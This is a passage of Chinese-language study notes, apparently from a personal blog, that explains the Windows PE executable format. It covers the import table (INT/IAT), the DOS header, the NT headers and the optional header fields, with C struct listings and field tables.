<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_DESCRIPTOR</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        DWORD   Characteristics;            <span class="comment">// 0 for terminating null import descriptor</span></span><br><span class="line">        DWORD   OriginalFirstThunk;         <span class="comment">// RVA to original unbound IAT (PIMAGE_THUNK_DATA)</span></span><br><span class="line">    &#125; DUMMYUNIONNAME;</span><br><span class="line">    DWORD   TimeDateStamp;                  <span class="comment">// 0 if not bound,</span></span><br><span class="line">                                            <span class="comment">// -1 if bound, and real date\time stamp</span></span><br><span class="line">                                            <span class="comment">//     in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT (new BIND)</span></span><br><span class="line">                                            <span class="comment">// O.W. date/time stamp of DLL bound to (Old BIND)</span></span><br><span class="line"></span><br><span class="line">    DWORD   ForwarderChain;                 <span class="comment">// -1 if no forwarders</span></span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   FirstThunk;                     <span class="comment">// RVA to IAT (if bound this IAT has actual addresses)</span></span><br><span class="line">&#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="left">成员</th>
<th align="left">数据宽度</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Characteristics</td>
<td align="left">DWORD</td>
<td align="left">标志为0表示结束，没有导入描述符了</td>
</tr>
<tr>
<td align="left">OriginalFirstThunk</td>
<td align="left">DWORD</td>
<td align="left">RVA指向IMAGE_THUNK_DATA结构数组 （桥1）</td>
</tr>
<tr>
<td align="left">TimeDateStamp</td>
<td align="left">DWORD</td>
<td align="left">时间戳</td>
</tr>
<tr>
<td align="left">ForwarderChain</td>
<td align="left">DWORD</td>
<td align="left">链表的前一个结构</td>
</tr>
<tr>
<td align="left">Name</td>
<td align="left">DWORD</td>
<td align="left">RVA，指向DLL名字，该名字以‘\0’为结尾</td>
</tr>
<tr>
<td align="left">FirstThunk</td>
<td align="left">DWORD</td>
<td align="left">RVA指向IMAGE_THUNK_DATA结构数组 （桥2）</td>
</tr>
</tbody></table>
<h4 id="Characteristics"><a href="#Characteristics" class="headerlink" title="Characteristics"></a>Characteristics</h4><p>标志 为0表示结束 没有导入描述符了</p>
<h4 id="IMAGE-THUNK-DATA"><a href="#IMAGE-THUNK-DATA" class="headerlink" title="IMAGE_THUNK_DATA"></a>IMAGE_THUNK_DATA</h4><p>在介绍OriginalFirstThunk之前，要先了解一下OriginalFirstThunk和FirstThunk所指向的<strong>结构数组</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015164516486.png" alt="image-20211015164516486"></p>
<p>指向的数组中每一项为一个结构，此结构名称是<strong>IMAGE_THUNK_DATA</strong></p>
<p>数组<strong>最后以一个内容全为0的IMAGE_THUNK_DATA作为结束</strong></p>
<p>IMAGE_THUNK_DATA实际上只是一个DWORD，但在不同的时刻却拥有不同的解释</p>
<p>IMAGE_THUNK_DATA有<strong>两种解释</strong>：</p>
<ul>
<li>DWORD最高位为0，那么该数值是一个RVA，指向_IMAGE__IMPORT_BY_NAME结构，表明函数是<strong>字符串类型的函数名导入的</strong></li>
<li>DWORD最高位为1，那么该数值的低31位就是函数的<strong>导出函数的序号</strong></li>
</ul>
<p>_IMAGE_IMPORT_BY_NAME结构:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">    WORD    Hint;</span><br><span class="line">    BYTE    Name[<span class="number">1</span>];</span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME, *PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>

<p>该结构即为：”编号—名称”（Hint/Name）描述部分</p>
<ul>
<li>Hint：导出函数地址表的<strong>索引编号</strong>，可能为空且<strong>不一定准确</strong>，由编译器决定，一般不使用该值</li>
<li>Name：这个是一个以”\0”结尾的字符串，表示函数名</li>
</ul>
<p>此时可发现，IMAGE_THUNK_DATA最终提供的数据只有两个：</p>
<ul>
<li>DWORD最高位为0时：需要导入函数的名称（Hint不一定准确，所以不使用）</li>
<li>DWORD最高位为1时：需要导入的函数在导出表中的序号</li>
</ul>
<p>此处对应了导出表笔记中的由导出表获得导出函数所需的两种方法</p>
<ol>
<li>根据函数名称获取导出函数地址</li>
<li>根据函数序号获取导出函数地址</li>
</ol>
<h4 id="OriginalFirstThunk"><a href="#OriginalFirstThunk" class="headerlink" title="OriginalFirstThunk"></a>OriginalFirstThunk</h4><p>因为它是指向另外数据结构的通路，因此简称为桥1。该字段指向一个包含了一系列结构的数组：IMAGE_THUNK_DATA</p>
<p>桥1所指向的地址列表被定义为：<strong>INT</strong>（Import Name Table） 导入名称表</p>
<h2 id="导入表的双桥结构"><a href="#导入表的双桥结构" class="headerlink" title="导入表的双桥结构"></a>导入表的双桥结构</h2><p>桥1 与 桥 2 最终的目的地都是一致的，都指向了引入函数的“编号-名称”（Hint/Name）描述部分</p>
<p>桥1到IMAGE_THUNK_DATA的过程中，经过了：<strong>INT</strong>（Import Name Table) 导入名称表</p>
<p>而桥2到IMAGE_THUNK_DATA的过程中，经过了: <strong>IAT</strong>（Import Address Table）导入地址表</p>
<h4 id="PE文件加载前"><a href="#PE文件加载前" class="headerlink" title="PE文件加载前"></a>PE文件加载前</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015193909496.png" alt="image-20211015193909496"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194546419.png" alt="image-20211015194546419"></p>
<h4 id="PE文件载入后"><a href="#PE文件载入后" class="headerlink" title="PE文件载入后"></a>PE文件载入后</h4><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194834185.png" alt="image-20211015194834185"></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E5%AF%BC%E5%85%A5%E8%A1%A8(2).assets/image-20211015194759949.png" alt="image-20211015194759949"></p>
<h4 id="加载前后对比"><a href="#加载前后对比" class="headerlink" title="加载前后对比"></a>加载前后对比</h4><ul>
<li>在PE文件加载前: 桥1指向INT和桥2指向的IAT的数据是<strong>相同</strong>的,但是其<strong>存储的位置是不同的</strong></li>
<li>在PE文件加载后：桥1指向的INT<strong>不变</strong>，但桥2指向的IAT的数值变成了函数相应的RVA地址</li>
</ul>
<p>另：函数相应的RVA地址是根据IAT中的函数名称或者导入表中的序号获得的。</p>
<h4 id="根据结构分析导入表"><a href="#根据结构分析导入表" class="headerlink" title="根据结构分析导入表"></a>根据结构分析导入表</h4><p>回到先前得到的导入表的FOA，在16进制编辑器中跳转至FOA：0x1CDA7C位置</p>
]]></content>
      <categories>
        <category>PE结构</category>
      </categories>
      <tags>
        <tag>PE结构</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-系统解密篇（1）</title>
    <url>/2021/10/12/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87(1)/</url>
    <content><![CDATA[<p><strong>学习课程-鱼C-小甲鱼【系统篇】《解密系列》单看课程记不住，想着好记性不如烂笔头，特此记录学习加深理解。</strong></p>
<h2 id="PE结构的概念"><a href="#PE结构的概念" class="headerlink" title="PE结构的概念"></a>PE结构的概念</h2><h3 id="EXE与DLL文件的区别"><a href="#EXE与DLL文件的区别" class="headerlink" title="EXE与DLL文件的区别"></a>EXE与DLL文件的区别</h3><p>EXE与DLL文件之间的区别完全是语意上面的，因为他们使用了完全相同的PE格式。唯一的区别在与是用一个字段标示出这个文件是EXE还是DLL文件格式。 </p>
<span id="more"></span>

<h3 id="64位与32位PE文件的区别"><a href="#64位与32位PE文件的区别" class="headerlink" title="64位与32位PE文件的区别"></a>64位与32位PE文件的区别</h3><p>64位的Windows仅仅知识对PE格式做了一些简单的修饰，新格式叫做PE32+ 并没有任何新的结构加进去，改变的只是简单的将32位字段扩展为64位，一般会在名称上表现出来：例如IMAGE_NT_HEADERS32 或 IMAGE_NT_HEADER64 来表示此结构用于32位还是64位PE文件。</p>
<h3 id="PE格式的定义"><a href="#PE格式的定义" class="headerlink" title="PE格式的定义"></a>PE格式的定义</h3><p>PE格式定义的主要地方位于头文件winnt.h，这个头文件中几乎能找到所有关于PE文件的定义。</p>
<p><strong>PE文件的架构结构</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012105635817.png" alt="image-20211012105635817"></p>
<h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li><p>PE文件使用的是一个平面地址空间，所有代码和数据都被合并在一起，组成一个很大的结构。</p>
</li>
<li><p>文件的内容被分割为不同的区块，块中包含代码或数据。各个区块按页边界来对齐，区块没有大小限制，是一个连续的结构。</p>
</li>
<li><p>此外，区块中的每个块有自己在内存中的一套属性，比如说这个区块是否包含代码，数据，是否可读或可写等权限的限制。</p>
</li>
<li><p>PE文件并不是作为单一内存映射文件而被装入内存的；Windows装载器(PE装载器)遍历PE文件并决定文件的哪一部分被映射，这种映射方式是将文件较高的偏移位置映射到 映射到较高的内存地址。映射后其结构某项的偏移地址可能区别于原始的偏移地址，但文件的整体结构不会发生改变。</p>
</li>
<li><p>磁盘文件一旦被映射装入内存，磁盘上的数据结构布局和内存中的数据结构布局是一致的。</p>
</li>
<li><p>数据之间的相对位置可能会发生改变，其某项的偏移地址可能会区别与原始的偏移地址，但不管如何，所有表现出来的信息都允许（接受）从磁盘文件偏移到内存偏移的转换。</p>
</li>
<li><p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012111242647.png" alt="image-20211012111242647"></p>
</li>
<li><p>PE文件块之间之所以会产生空隙，是因为需要进行对齐，便于磁盘内存管理。</p>
</li>
<li><p>PE文件通过Windows装载器装载进内存中后，DOS头、PE头和区块表的偏移位置与大小均不会发生改变，而各个区块映射到内存中后，其偏移位置则会发生改变。</p>
</li>
<li><p>磁盘中的PE文件与内存中的模块之间的偏移位置有可能会发生变化，是由于IMAGE_OPTIONAL_HEADER结构中的FileAlignment 与 SectionAlignment之间的值不同导致对齐标准不一而造成的。</p>
</li>
</ul>
<h3 id="PE结构的几个概念"><a href="#PE结构的几个概念" class="headerlink" title="PE结构的几个概念"></a>PE结构的几个概念</h3><p><strong>基地址 （ImageBase）</strong></p>
<p>是PE文件映射到内存文件后的PE结构的头地址，这个地址被称之为基地址。PE文件被映射到内存中后我们可以称之为一个<strong>模块(Module)</strong> , 其内存中的基地址就是模块的<strong>句柄(HModule)</strong>,获得句柄之后，也就是拿到了Pe结构的头部，根据头部中所存放的信息，我们拿到整个PE文件。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//LPCTSTR lpModulename 存有模块名的指针</span></span><br><span class="line"><span class="comment">//函数返回对应模块的句柄</span></span><br><span class="line"><span class="function">HMODULE <span class="title">GetModuleHandle</span><span class="params">(LPCTSTR lpModuleName)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>文件偏移地址</strong></p>
<p>PE文件的头地址在自身PE结构中都以0为开始地址，其他区块较头地址所相差的地址即为偏移地址</p>
<p><strong>虚拟地址(VA)与相对虚拟地址(RVA)</strong></p>
<p>虚拟地址:各个区块映射至内存之中可能会发生比例变化，为指出在内存中已经发生比例变化的各个区块的 地址，引出了**虚拟地址(VA)**的概念 。</p>
<p>相对虚拟地址:与PE文件的偏移地址相似，某一虚拟地址-基地址=相对虚拟地址</p>
<h2 id="各大部分"><a href="#各大部分" class="headerlink" title="各大部分"></a>各大部分</h2><p>MS-DOS头部</p>
<ul>
<li><p>根据上文的结构图可知，PE文件首个部分便是DOS头，有了DOS头，我们才能在DOS环境下执行PE文件，DOS系统才可识别出这是一个有效的执行体来从而执行。</p>
</li>
<li><p>PE文件的第一个字节起始于一个传统的MS-DOS头部，被称为IMAGE_DOS_HEADER。</p>
</li>
</ul>
<p><strong>IMAGE_DOS_HEADER</strong>(左侧+0h一列是文件头的偏移量)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">IMAGE_DOS_HEADER STRUCT</span><br><span class="line">&#123;</span><br><span class="line">+<span class="number">0</span>h WORD e_magic    <span class="comment">// Magic DOS signature MZ(4Dh 5Ah)     DOS可执行文件标记</span></span><br><span class="line">+<span class="number">2</span>h WORD e_cblp    <span class="comment">// Bytes on last page of file</span></span><br><span class="line">+<span class="number">4</span>h WORD e_cp    <span class="comment">// Pages in file</span></span><br><span class="line">+<span class="number">6</span>h WORD e_crlc    <span class="comment">// Relocations</span></span><br><span class="line">+<span class="number">8</span>h WORD e_cparhdr   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">+<span class="number">0</span>ah WORD e_minalloc   <span class="comment">// Minimun extra paragraphs needs</span></span><br><span class="line">+<span class="number">0</span>ch WORD e_maxalloc  <span class="comment">// Maximun extra paragraphs needs</span></span><br><span class="line">+<span class="number">0</span>eh WORD e_ss            <span class="comment">// intial(relative)SS value        DOS代码的初始化堆栈SS</span></span><br><span class="line">+<span class="number">10</span>h WORD e_sp     <span class="comment">// intial SP value                       DOS代码的初始化堆栈指针SP</span></span><br><span class="line">+<span class="number">12</span>h WORD e_csum     <span class="comment">// Checksum</span></span><br><span class="line">+<span class="number">14</span>h WORD e_ip     <span class="comment">// intial IP value               DOS代码的初始化指令入口[指针IP]</span></span><br><span class="line">+<span class="number">16</span>h WORD e_cs     <span class="comment">// intial(relative)CS value         DOS代码的初始堆栈入口</span></span><br><span class="line">+<span class="number">18</span>h WORD e_lfarlc     <span class="comment">// File Address of relocation table</span></span><br><span class="line">+<span class="number">1</span>ah WORD e_ovno         <span class="comment">// Overlay number</span></span><br><span class="line">+<span class="number">1</span>ch WORD e_res[<span class="number">4</span>]      <span class="comment">// Reserved words</span></span><br><span class="line">+<span class="number">24</span>h WORD e_oemid      <span class="comment">// OEM identifier(for e_oeminfo)</span></span><br><span class="line">+<span class="number">26</span>h WORD      e_oeminfo   <span class="comment">// OEM information;e_oemid specific</span></span><br><span class="line">+<span class="number">29</span>h WORD e_res2[<span class="number">10</span>]   <span class="comment">// Reserved words</span></span><br><span class="line">+<span class="number">3</span>ch DWORD   e_lfanew     <span class="comment">//  Offset to start of PE header      指向PE文件头</span></span><br><span class="line">&#125; IMAGE_DOS_HEADER ENDS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e_magic：一个WORD类型，值是一个常数<span class="number">0x4D5A</span>，用文本编辑器查看该值位‘MZ’，可执行文件必须都是<span class="string">&#x27;MZ&#x27;</span>开头。</span><br><span class="line">e_lfanew：为<span class="number">32</span>位可执行文件扩展的域，用来表示DOS头之后的NT头相对文件起始地址的偏移。</span><br></pre></td></tr></table></figure>



<h3 id="PE文件头"><a href="#PE文件头" class="headerlink" title="PE文件头"></a>PE文件头</h3><ul>
<li>PE文件头（PE Header）紧挨着DOS stub</li>
<li>PE Header是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，里面包含着许多PE装载器用到的重要字段</li>
<li>执行体在支持PE文件结构的操作系统中执行时，PE装载器将从IMAGE_DOS_HEADER结构中的e_lfanew字字段里找到PE Header的起始偏移量，加上基地址就得到PE文件头的指针</li>
<li>PNTHeader  = ImageBase + dosHeader -&gt;e_lfanew</li>
</ul>
<h3 id="IMAGE-NT-HEADERS结构"><a href="#IMAGE-NT-HEADERS结构" class="headerlink" title="IMAGE_NT_HEADERS结构"></a>IMAGE_NT_HEADERS结构</h3><p>PE Header 是PE相关结构NT映像头（IMAGE_NT_HEADER）的简称，里面包含着许多PE装载器要用到的重要字段</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> IMAGE_NT_HEADERS STRUCT </span><br><span class="line">&#123; </span><br><span class="line">+<span class="number">0</span>h  DWORD	Signature  <span class="comment">//标示这是否是一个有效的PE文件</span></span><br><span class="line">+<span class="number">4</span>h  IMAGE_FILE_HEADER FileHeader <span class="comment">//</span></span><br><span class="line">+<span class="number">18</span>	 hIMAGE_OPTIONAL_HEADER32	OptionalHeader   <span class="comment">//</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS ENDS</span><br></pre></td></tr></table></figure>

<p><strong>Signature</strong></p>
<p> 在一个有效的 PE 文件里，Signature 字段被设置为00004550h, ASCII 码字符是“PE00”。标志这 PE 文件头的开始，于16进制编辑器中为50 45 00 00h ,进制转换后为00 00 45 50h。</p>
<p>DOS头部的指针e_lfanew指向PE头的首地址，从而找到PE文件头</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012122520702.png" alt="image-20211012122520702"></p>
<p><strong>IMAGE_FILE_HEADER 结构</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> 	<span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> </span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">+<span class="number">04</span>h	WORD  		Machine;                              	<span class="comment">// 运行平台</span></span><br><span class="line"></span><br><span class="line">+<span class="number">06</span>h  	WORD  		NumberOfSections;			<span class="comment">// 文件的区块数目</span></span><br><span class="line"></span><br><span class="line">+<span class="number">08</span>h	DWORD 		TimeDateStamp;			<span class="comment">// 文件创建日期和时间</span></span><br><span class="line"></span><br><span class="line">+<span class="number">0</span>Ch  	DWORD 		PointerToSymbolTable;		<span class="comment">// 指向符号表(主要用于调试)</span></span><br><span class="line"></span><br><span class="line">+<span class="number">10</span>h 	DWORD 		NumberOfSymbols;			<span class="comment">// 符号表中符号个数(同上)</span></span><br><span class="line"></span><br><span class="line">+<span class="number">14</span>h  	WORD  		SizeOfOptionalHeader;		<span class="comment">// IMAGE_OPTIONAL_HEADER32 结构大小</span></span><br><span class="line"></span><br><span class="line">+<span class="number">16</span>h  	WORD  		Characteristics;				<span class="comment">// 文件属性</span></span><br><span class="line"></span><br><span class="line">&#125; IMAGE_FILE_HEADER,  *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<p>（1）Machine：可执行文件的目标CPU类型，WORD类型 长度为4字节</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012123430885.png" alt="image-20211012123430885"></p>
<p>（2）NumberOfSection：区块的数目(IMAGE_NT_HEADERS ) WORD类型 2字节</p>
<p>（3）TimeDataStamp: 表明文件是何时被创建的 DWORD 4字节</p>
<p>​    TimeDataStamp: 表明文件是何时被创建的。</p>
<p>这个值是自1970年1月1日以来用格林威治时间（GMT）计算的秒数，这个值是比文件系统（FILESYSTEM）的日期时间更加精确的指示器</p>
<p>VC的话可以用_ctime 函数或者 gmtime 函数。</p>
<p>（4）PointerToSymbolTable: COFF 符号表的文件偏移位置，现在基本没用了</p>
<p>（5）NumberOfSymbols: 如果有COFF 符号表，它代表其中的符号数目，COFF符号是一个大小固定的结构，如果想找到COFF 符号表的结束位置，则需要这个变量。</p>
<p>（6）SizeOfOptionalHeader: 紧跟着IMAGE_FILE_HEADER 后边的数据结构（IMAGE_OPTIONAL_HEADER）的大小。(对于32位PE文件，这个值通常是00E0h；对于64位PE32+文件，这个值是00F0h )。</p>
<p>SizeOfOptionalHeader相较PE头偏移<strong>14h</strong>注意，偏移量是16进制的，拿到x64位系统下的IMAGE_OPTIONAL_HEADER32的结构大小0x00F0 <strong>(注意大小头问题!!!!)</strong></p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012231010016.png" alt="image-20211012231010016"></p>
<p>（7）Characteristics: 文件属性，有选择的通过几个值可以运算得到。( 这些标志的有效值是定义于 winnt.h 内的  IMAGE_FILE_** 的值，具体含义见下表。普通的EXE文件这个字段的值一般是 0100h，DLL文件这个字段的值一般是  210Eh。)多种属性可以通过 “或运算” 使得同时拥有！</p>
<table>
<thead>
<tr>
<th>Value</th>
<th align="center">Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>IMAGE_FILE_RELOCS_STRIPPED  0x0001</td>
<td align="center">Relocation information was stripped from the file. The file must be loaded at its preferred base address. If the base address is not available, the loader reports an error.</td>
</tr>
<tr>
<td>IMAGE_FILE_EXECUTABLE_IMAGE0x0002</td>
<td align="center">The file is executable (there are no unresolved external references).</td>
</tr>
<tr>
<td>IMAGE_FILE_LINE_NUMS_STRIPPED0x0004</td>
<td align="center">COFF line numbers were stripped from the file.</td>
</tr>
<tr>
<td>IMAGE_FILE_LOCAL_SYMS_STRIPPED0x0008</td>
<td align="center">COFF symbol table entries were stripped from file.</td>
</tr>
<tr>
<td>IMAGE_FILE_AGGRESIVE_WS_TRIM0x0010</td>
<td align="center">Aggressively trim the working set. This value is obsolete as of Windows 2000.</td>
</tr>
<tr>
<td>IMAGE_FILE_LARGE_ADDRESS_AWARE0x0020</td>
<td align="center">The application can handle addresses larger than 2 GB.</td>
</tr>
<tr>
<td>IMAGE_FILE_BYTES_REVERSED_LO0x0080</td>
<td align="center">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
<tr>
<td>IMAGE_FILE_32BIT_MACHINE0x0100</td>
<td align="center">The computer supports 32-bit words.</td>
</tr>
<tr>
<td>IMAGE_FILE_DEBUG_STRIPPED0x0200</td>
<td align="center">Debugging information was removed and stored separately in another file.</td>
</tr>
<tr>
<td>IMAGE_FILE_REMOVABLE_RUN_FROM_SWAP0x0400</td>
<td align="center">If the image is on removable media, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td>IMAGE_FILE_NET_RUN_FROM_SWAP0x0800</td>
<td align="center">If the image is on the network, copy it to and run it from the swap file.</td>
</tr>
<tr>
<td>IMAGE_FILE_SYSTEM0x1000</td>
<td align="center">The image is a system file.</td>
</tr>
<tr>
<td>IMAGE_FILE_DLL0x2000</td>
<td align="center">The image is a DLL file. While it is an executable file, it cannot be run directly.</td>
</tr>
<tr>
<td>IMAGE_FILE_UP_SYSTEM_ONLY0x4000</td>
<td align="center">The file should be run only on a uniprocessor computer.</td>
</tr>
<tr>
<td>IMAGE_FILE_BYTES_REVERSED_HI0x8000</td>
<td align="center">The bytes of the word are reversed. This flag is obsolete.</td>
</tr>
</tbody></table>
<h3 id="IMAGE-OPTIONAL-HEADER结构"><a href="#IMAGE-OPTIONAL-HEADER结构" class="headerlink" title="IMAGE_OPTIONAL_HEADER结构"></a>IMAGE_OPTIONAL_HEADER结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> typedef struct _IMAGE_OPTIONAL_HEADER </span><br><span class="line">&#123;</span><br><span class="line">    //</span><br><span class="line">    // Standard fields.  </span><br><span class="line">    //</span><br><span class="line">+18h    WORD    Magic;         // 标志字, ROM 映像（0107h）,普通可执行文件（010Bh）</span><br><span class="line">+1Ah    BYTE      MajorLinkerVersion;     // 链接程序的主版本号</span><br><span class="line">+1Bh    BYTE      MinorLinkerVersion;     // 链接程序的次版本号</span><br><span class="line">+1Ch    DWORD   SizeOfCode;     // 所有含代码的节的总大小</span><br><span class="line">+20h    DWORD   SizeOfInitializedData;    // 所有含已初始化数据的节的总大小</span><br><span class="line">+24h    DWORD   SizeOfUninitializedData; // 所有含未初始化数据的节的大小</span><br><span class="line">+28h    DWORD   AddressOfEntryPoint;    // 程序执行入口RVA</span><br><span class="line">+2Ch    DWORD   BaseOfCode;      // 代码的区块的起始RVA</span><br><span class="line">+30h    DWORD   BaseOfData;      // 数据的区块的起始RVA</span><br><span class="line">    //</span><br><span class="line">    // NT additional fields.    以下是属于NT结构增加的领域。</span><br><span class="line">    //</span><br><span class="line">+34h    DWORD   ImageBase;      // 程序的首选装载地址</span><br><span class="line">+38h    DWORD   SectionAlignment;      // 内存中的区块的对齐大小</span><br><span class="line">+3Ch    DWORD   FileAlignment;      // 文件中的区块的对齐大小</span><br><span class="line">+40h    WORD    MajorOperatingSystemVersion;  // 要求操作系统最低版本号的主版本号</span><br><span class="line">+42h    WORD    MinorOperatingSystemVersion;  // 要求操作系统最低版本号的副版本号</span><br><span class="line">+44h    WORD    MajorImageVersion;       // 可运行于操作系统的主版本号</span><br><span class="line">+46h    WORD    MinorImageVersion;       // 可运行于操作系统的次版本号</span><br><span class="line">+48h    WORD    MajorSubsystemVersion;  // 要求最低子系统版本的主版本号</span><br><span class="line">+4Ah    WORD    MinorSubsystemVersion;  // 要求最低子系统版本的次版本号</span><br><span class="line">+4Ch    DWORD   Win32VersionValue;       // 莫须有字段，不被病毒利用的话一般为0</span><br><span class="line">+50h    DWORD   SizeOfImage;       // 映像装入内存后的总尺寸</span><br><span class="line">+54h    DWORD   SizeOfHeaders;       // 所有头 + 区块表的尺寸大小</span><br><span class="line">+58h    DWORD   CheckSum;       // 映像的校检和</span><br><span class="line">+5Ch    WORD    Subsystem;       // 可执行文件期望的子系统</span><br><span class="line">+5Eh    WORD    DllCharacteristics;       // DllMain()函数何时被调用，默认为 0</span><br><span class="line">+60h    DWORD   SizeOfStackReserve;       // 初始化时的栈大小</span><br><span class="line">+64h    DWORD   SizeOfStackCommit;       // 初始化时实际提交的栈大小</span><br><span class="line">+68h    DWORD   SizeOfHeapReserve;        // 初始化时保留的堆大小</span><br><span class="line">+6Ch    DWORD   SizeOfHeapCommit;        // 初始化时实际提交的堆大小</span><br><span class="line">+70h    DWORD   LoaderFlags;        // 与调试有关，默认为 0 </span><br><span class="line">+74h    DWORD   NumberOfRvaAndSizes;  // 下边数据目录的项数，这个字段自Windows NT 发布以来        // 一直是16</span><br><span class="line">+78h    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES] ;</span><br><span class="line">       // 数据目录表,里面的数组[]一直以来都为16个元素,可以直接写为</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[16]</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>以上结构中的大部分字段都不重要，我们可以从注释中进行理解使用，不必死记硬背，接下来解释其中较为重要的字段</p>
<ul>
<li><p><strong>AddressOfEntryPoint字段</strong>(+28h) DWORD 32位下4 byte</p>
<p>指出文件被执行时的入口地址，这是一个RVA地址(相对虚拟地址)如果在一个可执行文件上附加了一段代码并想让这段代码首先被执行，那么只需要让这个入口地址指向附加的代码就可以了。</p>
<p>PE头基地址为140h+28h偏移并根据大小端模式可看出入口的相对虚拟地址为0X000C0CB4 </p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012210838177.png" alt="image-20211012210838177"></p>
</li>
<li><p><strong>ImageBase</strong>(+34h)</p>
<p>ImageBase字段指出文件的优先装入地址。也就是说当文件被执行时如果可能的话，Windows优先将文件装入指定的内存地址，若该内存地址已被其他模块占用时，文件才被装入到其他空余的内存地址当中。链接器产生可执行文件的时候对应这个地址来生成机器码。所以当文件可装入这个内存地址时，不需要重定向操作，装入的速度最快，若<strong>ImageBase</strong>指定的内存地址被占用，那么链接器将不得不重定向空余内存地址将PE文件装入，相比之下，会慢上一些。</p>
<p>PE头基地址为140h+34h</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-%E7%B3%BB%E7%BB%9F%E8%A7%A3%E5%AF%86%E7%AF%87.assets/image-20211012210558148.png" alt="image-20211012210558148"></p>
</li>
</ul>
<p>另外，虚拟地址空间与物理地址空间并不是一个东西，不可以混为一谈，我们可以这么理解，我们c/c++程序中访问的内存地址，并不是实际上的物理内存地址，而是虚拟内存地址，程序访问内存地址时，先是访问虚拟地址，通过页表等手段将虚拟地址映射到物理内存地址上，如此进行间接的访问物理内存地址。并且由于每个程序都有自己的虚拟内存地址，其映射出的物理内存地址也不同，可通过此手段对内存地址进行隔离。</p>
<p>​    <strong>对于EXE文件来说</strong>，由于每个文件总是使用独立的虚拟地址空间，优先装入地址不可能被其他模块占据，所以EXE总是能按照此地址装入，这也意味着EXE文件不需重定位信息</p>
<p>​    <strong>对于DLL文件来说</strong>，由于多个DLL文件共享使用宿主EXE文件的地址空间，不能保证优先装入地址没有被其他的DLL使用，所以DLL文件必须包含重定位信息以防万一。因此前面的IMAGE_FILE_HEADER结构的Characteristics字段中，DLL文件对应的IMAGE_FILE_RELOCS_STRIPPED位总为0，而EXE文件的这个标志位总为1.</p>
<p>​    在链接的时候，可以通过对link.exe指定/base:address选项来自定义优先装入地址，如果不指定这个选项的话，一般EXE文件的默认优先装入地址被定位00400000h,而DLL文件的默认优先装入地址被定为10000000h。</p>
<ul>
<li><strong>SectionAlignment字段和FileAlignment字段</strong></li>
</ul>
<p>SectionAlignment字段制定了节被装入福内存后的对其单位。也就是说每个节被装入的地址必定是本字段指定数值的整数倍。而FileAligment字段制定了节存储在磁盘文件中时的对齐单位。</p>
<ul>
